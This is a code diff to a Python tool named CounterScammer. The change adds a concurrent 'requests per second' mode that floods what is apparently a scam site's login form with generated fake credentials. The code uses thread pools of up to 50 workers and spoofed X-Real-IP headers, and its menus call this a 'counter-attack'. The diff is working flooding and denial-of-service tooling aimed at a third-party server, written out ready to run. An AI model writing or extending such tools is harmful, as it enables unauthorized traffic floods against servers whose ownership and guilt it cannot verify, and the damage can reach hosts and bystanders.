@@ -7,6 +7,8 @@ import string
 import time
 import sys
 import os
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Add parent directory to path to import custom UserAgent
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -299,6 +301,126 @@ class CounterScammer:
         headers['X-Real-IP'] = self.generate_fake_ip()
         
         return headers
+    
+    def send_concurrent_requests(self, requests_data: list, rps: int, duration: int) -> list:
+        """
+        Send multiple requests concurrently to achieve target RPS.
+        
+        Args:
+            requests_data (list): List of dictionaries containing form_data and headers
+            rps (int): Target requests per second
+            duration (int): Duration in seconds
+            
+        Returns:
+            list: List of response objects
+        """
+        responses = []
+        successful_requests = 0
+        failed_requests = 0
+        request_times = []
+        
+        def send_single_request(request_info, request_index):
+            """Send a single request and return the result."""
+            try:
+                form_data = request_info['form_data']
+                custom_headers = request_info['headers']
+                login_type = request_info['login_type']
+                
+                start_time = time.time()
+                response = self.send_request(form_data, custom_headers)
+                end_time = time.time()
+                
+                return {
+                    'index': request_index,
+                    'response': response,
+                    'success': response.status_code == 200,
+                    'form_data': form_data,
+                    'login_type': login_type,
+                    'request_time': end_time - start_time
+                }
+            except Exception as e:
+                return {
+                    'index': request_index,
+                    'response': None,
+                    'success': False,
+                    'form_data': request_info['form_data'],
+                    'login_type': request_info['login_type'],
+                    'error': str(e),
+                    'request_time': 0
+                }
+        
+        # Calculate batch size and intervals
+        batch_interval = 1.0  # Send batches every second
+        requests_per_batch = rps
+        total_batches = duration
+        
+        print(f"Sending {requests_per_batch} requests per second for {duration} seconds...")
+        print(f"Total batches: {total_batches}, Requests per batch: {requests_per_batch}")
+        
+        start_time = time.time()
+        
+        for batch_num in range(total_batches):
+            batch_start_time = time.time()
+            
+            # Get requests for this batch
+            batch_start_index = batch_num * requests_per_batch
+            batch_end_index = min(batch_start_index + requests_per_batch, len(requests_data))
+            batch_requests = requests_data[batch_start_index:batch_end_index]
+            
+            if not batch_requests:
+                break
+            
+            print(f"\nBatch {batch_num + 1}/{total_batches}: Sending {len(batch_requests)} requests...")
+            
+            # Use ThreadPoolExecutor to send requests concurrently
+            with ThreadPoolExecutor(max_workers=min(50, len(batch_requests))) as executor:
+                # Submit all requests in this batch
+                future_to_request = {
+                    executor.submit(send_single_request, req, batch_start_index + i): (batch_start_index + i, req)
+                    for i, req in enumerate(batch_requests)
+                }
+                
+                # Collect results as they complete
+                batch_results = []
+                for future in as_completed(future_to_request):
+                    result = future.result()
+                    batch_results.append(result)
+                    
+                    # Show progress for this batch
+                    form_data = result['form_data']
+                    index = result['index']
+                    print(f"[{index + 1}/{len(requests_data)}] {form_data['login']} - {form_data['email']} - {form_data['password']} - {form_data['pass']} - {form_data['phone']} - {form_data['points']}")
+                
+                # Process batch results
+                for result in batch_results:
+                    if result['success']:
+                        successful_requests += 1
+                        responses.append(result['response'])
+                    else:
+                        failed_requests += 1
+                        if result['response']:
+                            responses.append(result['response'])
+                    
+                    if 'request_time' in result:
+                        request_times.append(result['request_time'])
+            
+            # Wait for next batch (maintain 1-second intervals)
+            batch_elapsed = time.time() - batch_start_time
+            if batch_elapsed < batch_interval and batch_num < total_batches - 1:
+                sleep_time = batch_interval - batch_elapsed
+                time.sleep(sleep_time)
+        
+        end_time = time.time()
+        total_time = end_time - start_time
+        
+        return {
+            'responses': responses,
+            'successful_requests': successful_requests,
+            'failed_requests': failed_requests,
+            'total_time': total_time,
+            'request_times': request_times,
+            'actual_rps': len(requests_data) / total_time if total_time > 0 else 0
+        }
 
 
 # Example usage and testing functions
@@ -454,16 +576,71 @@ def interactive_counter_attack():
     print()
     
     try:
-        # Get number of requests
+        # Choose attack mode
+        print("Select attack mode:")
+        print("1 - Fixed number of requests with delay")
+        print("2 - Requests per second (RPS) mode")
+        
         while True:
             try:
-                num_requests = int(input("Enter number of requests to send: "))
-                if num_requests > 0:
+                mode = int(input("Enter your choice (1 or 2): "))
+                if mode in [1, 2]:
                     break
                 else:
-                    print("Please enter a positive number.")
+                    print("Please enter 1 or 2.")
             except ValueError:
-                print("Please enter a valid number.")
+                print("Please enter a valid number (1 or 2).")
+        
+        if mode == 1:
+            # Original mode - fixed number with delay
+            # Get number of requests
+            while True:
+                try:
+                    num_requests = int(input("Enter number of requests to send: "))
+                    if num_requests > 0:
+                        break
+                    else:
+                        print("Please enter a positive number.")
+                except ValueError:
+                    print("Please enter a valid number.")
+            
+            # Get delay between requests
+            while True:
+                try:
+                    delay = float(input("Enter delay between requests in seconds (e.g., 1.5): "))
+                    if delay >= 0:
+                        break
+                    else:
+                        print("Please enter a non-negative number.")
+                except ValueError:
+                    print("Please enter a valid number.")
+            
+            total_requests = num_requests
+            
+        else:
+            # RPS mode - requests per second
+            while True:
+                try:
+                    rps = int(input("Enter requests per second (e.g., 100): "))
+                    if rps > 0:
+                        break
+                    else:
+                        print("Please enter a positive number.")
+                except ValueError:
+                    print("Please enter a valid number.")
+            
+            while True:
+                try:
+                    duration = int(input("Enter duration in seconds (e.g., 2): "))
+                    if duration > 0:
+                        break
+                    else:
+                        print("Please enter a positive number.")
+                except ValueError:
+                    print("Please enter a valid number.")
+            
+            total_requests = rps * duration
+            delay = 1.0 / rps  # Calculate delay between requests
         
         # Get login type preference
         print("\nSelect login type:")
@@ -492,22 +669,19 @@ def interactive_counter_attack():
             login_types = ["google"]
             choice_name = "Google Play only"
         
-        # Get delay between requests
-        while True:
-            try:
-                delay = float(input("Enter delay between requests in seconds (e.g., 1.5): "))
-                if delay >= 0:
-                    break
-                else:
-                    print("Please enter a non-negative number.")
-            except ValueError:
-                print("Please enter a valid number.")
-        
         print(f"\n" + "="*60)
         print(f"ATTACK CONFIGURATION:")
-        print(f"Number of requests: {num_requests}")
+        if mode == 1:
+            print(f"Mode: Fixed requests with delay")
+            print(f"Number of requests: {total_requests}")
+            print(f"Delay between requests: {delay} seconds")
+        else:
+            print(f"Mode: Requests per second (RPS)")
+            print(f"Requests per second: {rps}")
+            print(f"Duration: {duration} seconds")
+            print(f"Total requests: {total_requests}")
+            print(f"Delay between requests: {delay:.4f} seconds")
         print(f"Login type: {choice_name}")
-        print(f"Delay between requests: {delay} seconds")
         print(f"="*60)
         
         # Confirm before starting
@@ -519,7 +693,7 @@ def interactive_counter_attack():
         # Generate requests data silently
         requests_data = []
         
-        for i in range(num_requests):
+        for i in range(total_requests):
             # Choose login type
             if len(login_types) == 1:
                 login_type = login_types[0]
@@ -540,43 +714,62 @@ def interactive_counter_attack():
         print("EXECUTING COUNTER-ATTACK...")
         print(f"="*60)
         
-        # Execute requests
-        responses = []
-        successful_requests = 0
-        failed_requests = 0
-        
-        for i, request_info in enumerate(requests_data):
-            form_data = request_info['form_data']
-            custom_headers = request_info['headers']
-            login_type = request_info['login_type']
+        if mode == 1:
+            # Original sequential mode
+            responses = []
+            successful_requests = 0
+            failed_requests = 0
+            start_time = time.time()
             
-            # Show request in the specified format: [1/10] login - email - password - pass - phone - points
-            print(f"[{i+1}/{num_requests}] {form_data['login']} - {form_data['email']} - {form_data['password']} - {form_data['pass']} - {form_data['phone']} - {form_data['points']}")
-            
-            try:
-                response = scammer.send_request(form_data, custom_headers)
-                responses.append(response)
+            for i, request_info in enumerate(requests_data):
+                form_data = request_info['form_data']
+                custom_headers = request_info['headers']
+                login_type = request_info['login_type']
                 
-                if response.status_code == 200:
-                    successful_requests += 1
-                else:
+                # Show request in the specified format: [1/200] login - email - password - pass - phone - points
+                print(f"[{i+1}/{total_requests}] {form_data['login']} - {form_data['email']} - {form_data['password']} - {form_data['pass']} - {form_data['phone']} - {form_data['points']}")
+                
+                try:
+                    response = scammer.send_request(form_data, custom_headers)
+                    responses.append(response)
+                    
+                    if response.status_code == 200:
+                        successful_requests += 1
+                    else:
+                        failed_requests += 1
+                    
+                except Exception as e:
                     failed_requests += 1
-                
-            except Exception as e:
-                failed_requests += 1
-                
-            # Add delay between requests (except for the last one)
-            if i < num_requests - 1 and delay > 0:
-                time.sleep(delay)
+                    
+                # Add delay between requests (except for the last one)
+                if i < total_requests - 1 and delay > 0:
+                    time.sleep(delay)
+            
+            end_time = time.time()
+            total_time = end_time - start_time
+            actual_rps = total_requests / total_time if total_time > 0 else 0
+            
+        else:
+            # RPS mode - use concurrent requests
+            result = scammer.send_concurrent_requests(requests_data, rps, duration)
+            responses = result['responses']
+            successful_requests = result['successful_requests']
+            failed_requests = result['failed_requests']
+            total_time = result['total_time']
+            actual_rps = result['actual_rps']
         
         # Final summary
         print(f"\n" + "="*60)
         print(f"COUNTER-ATTACK COMPLETED!")
         print(f"="*60)
-        print(f"Total requests sent: {num_requests}")
+        print(f"Total requests sent: {total_requests}")
         print(f"Successful requests (200): {successful_requests}")
         print(f"Failed requests: {failed_requests}")
-        print(f"Success rate: {(successful_requests/num_requests)*100:.1f}%")
+        print(f"Success rate: {(successful_requests/total_requests)*100:.1f}%")
+        print(f"Total time: {total_time:.2f} seconds")
+        print(f"Actual RPS: {actual_rps:.2f} requests/second")
+        if mode == 2:
+            print(f"Target RPS: {rps} requests/second")
         print(f"="*60)
         
         # Ask if user wants detailed response analysis
